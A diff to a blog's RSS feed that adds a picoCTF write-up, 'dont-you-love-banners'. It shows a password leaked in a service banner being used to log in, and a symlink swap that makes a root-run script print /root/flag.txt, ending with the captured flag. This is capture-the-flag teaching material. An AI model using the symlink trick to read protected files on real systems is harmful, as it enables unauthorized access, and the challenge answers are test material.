@@ -7,10 +7,120 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>cn</language>
     <copyright>Copyright © 2008–2019</copyright>
-    <lastBuildDate>Thu, 24 Oct 2024 12:52:41 +0300</lastBuildDate>
+    <lastBuildDate>Thu, 24 Oct 2024 15:32:01 +0300</lastBuildDate>
     
 	<atom:link href="//localhost:1313/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>dont-you-love-banners</title>
+      <link>//localhost:1313/post/picoctf3/</link>
+      <pubDate>Thu, 24 Oct 2024 15:32:01 +0300</pubDate>
+      
+      <guid>//localhost:1313/post/picoctf3/</guid>
+      <description>&lt;h3 id=&#34;level-description&#34;&gt;Level Description&lt;/h3&gt;
+&lt;p&gt;Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 55626. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 59416. From the above information abuse the machine and find the flag in the /root directory.&lt;/p&gt;
+&lt;h3 id=&#34;doc&#34;&gt;Doc&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/&#34;&gt;Symlinks.&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;solution&#34;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;Logging in on the nc connection provided hits you with a password request.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;03:35:14 archie@Archie ~ → nc tethys.picoctf.net 52675
+*************************************
+**************WELCOME****************
+*************************************
+
+what is the password?
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The next logical step is to investigate the netcat in the header in order to get the &amp;ldquo;leaked&amp;rdquo; information.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;03:36:19 archie@Archie ~ → nc tethys.picoctf.net 65227
+SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That gives you the password and next, you are prompted with some general questions that you can find the answers to on google :&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;03:38:08 archie@Archie ~ → nc tethys.picoctf.net 52675
+*************************************
+**************WELCOME****************
+*************************************
+
+what is the password?
+My_Passw@rd_@1234
+What is the top cyber security conference in the world?
+Defcon
+the first hacker ever was known for phreaking(making free phone calls), who was it?
+John Draper
+player@challenge:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, you are in the machine. Let`s investigate the pwd.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ cat banner
+cat banner
+*************************************
+**************WELCOME****************
+*************************************
+player@challenge:~$ cat text
+cat text
+keep digging
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This didn`t help very much but navigationg to the root directory will.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;player@challenge:/$ cd root
+cd root
+player@challenge:/root$ ls
+ls
+flag.txt  script.py
+player@challenge:/root$ cat flag.txt
+cat flag.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;script.py :&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import os
+import pty
+
+incorrect_ans_reply = &amp;#34;Lol, good try, try again and good luck\n&amp;#34;
+
+if __name__ == &amp;#34;__main__&amp;#34;:
+    try:
+      with open(&amp;#34;/home/player/banner&amp;#34;, &amp;#34;r&amp;#34;) as f:
+        print(f.read())
+    except:
+      print(&amp;#34;*********************************************&amp;#34;)
+      print(&amp;#34;***************DEFAULT BANNER****************&amp;#34;)
+      print(&amp;#34;*Please supply banner in /home/player/banner*&amp;#34;)
+      print(&amp;#34;*********************************************&amp;#34;)
+
+try:
+    request = input(&amp;#34;what is the password? \n&amp;#34;).upper()
+    while request:
+        if request == &amp;#39;MY_PASSW@RD_@1234&amp;#39;:
+            text = input(&amp;#34;What is the top cyber security conference in the world?\n&amp;#34;).upper()
+            if text == &amp;#39;DEFCON&amp;#39; or text == &amp;#39;DEF CON&amp;#39;:
+                output = input(
+                    &amp;#34;the first hacker ever was known for phreaking(making free phone calls), who was it?\n&amp;#34;).upper()
+                if output == &amp;#39;JOHN DRAPER&amp;#39; or output == &amp;#39;JOHN THOMAS DRAPER&amp;#39; or output == &amp;#39;JOHN&amp;#39; or output== &amp;#39;DRAPER&amp;#39;:
+                    scmd = &amp;#39;su - player&amp;#39;
+                    pty.spawn(scmd.split(&amp;#39; &amp;#39;))
+
+                else:
+                    print(incorrect_ans_reply)
+            else:
+                print(incorrect_ans_reply)
+        else:
+            print(incorrect_ans_reply)
+            break
+
+except:
+    KeyboardInterrupt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The interesting part of all of this is the fact that the script reads the banner file in your home directory using elevated priviledges. This basically boils down to the fact that if you could somehow change the file from banner to flag.txt you could in theory get the password for the next level. Here is where symlinks come in handy. They are basically the same thing as a shortcut on windows. The taught process is that we remove the file, create a link to the file that we actually want to read then run the script.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;player@challenge:~$ rm banner
+rm banner
+player@challenge:~$ ls
+ls
+text
+player@challenge:~$ ln -s /root/flag.txt banner
+ln -s /root/flag.txt banner
+player@challenge:~$ ls
+ls
+banner  text
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, when you log into the same instance once again, the script will execute and hopefully spit out the password.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Next login :&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;03:49:07 archie@Archie ~ → nc tethys.picoctf.net 52675
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
     
     <item>
       <title>Picker IV</title>
@@ -3118,8 +3228,8 @@ A sollution to this problem would be minimizing your terminal as much as possibl
 &lt;table&gt;
   &lt;thead&gt;
       &lt;tr&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;&lt;img src=&#34;//localhost:1313/img/bandit26-terminal1.jpg&#34; alt=&#34;image&#34;&gt;&lt;/th&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;&lt;img src=&#34;//localhost:1313/img/bandit26-terminal2.jpg&#34; alt=&#34;image&#34;&gt;&lt;/th&gt;
+          &lt;th&gt;&lt;img src=&#34;//localhost:1313/img/bandit26-terminal1.jpg&#34; alt=&#34;image&#34;&gt;&lt;/th&gt;
+          &lt;th&gt;&lt;img src=&#34;//localhost:1313/img/bandit26-terminal2.jpg&#34; alt=&#34;image&#34;&gt;&lt;/th&gt;
       &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
